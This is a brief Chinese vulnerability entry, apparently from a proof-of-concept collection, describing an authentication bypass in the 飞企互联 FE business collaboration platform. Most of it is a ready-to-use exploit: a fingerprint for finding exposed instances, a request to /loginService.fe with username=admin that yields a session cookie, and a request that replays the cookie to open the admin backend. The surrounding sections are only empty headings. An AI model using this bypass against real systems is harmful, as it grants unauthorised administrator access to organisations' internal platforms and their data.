# 飞企互联FE业务协作平台存在身份认证绕过漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`GET /loginService.fe?op=D&username=admin HTTP/1.1`

**请求体 / payload**
```
1. 获取cookie
Host: {hostname}
2. 使用获取的cookie登录后台
GET /main/main.jsp HTTP/1.1
Host: {hostname}
Cookie: {cookie}
```

**其他**
- 飞企互联FE业务协作平台存在身份认证绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 广东飞企互联科技股份有限公司企业运营管理平台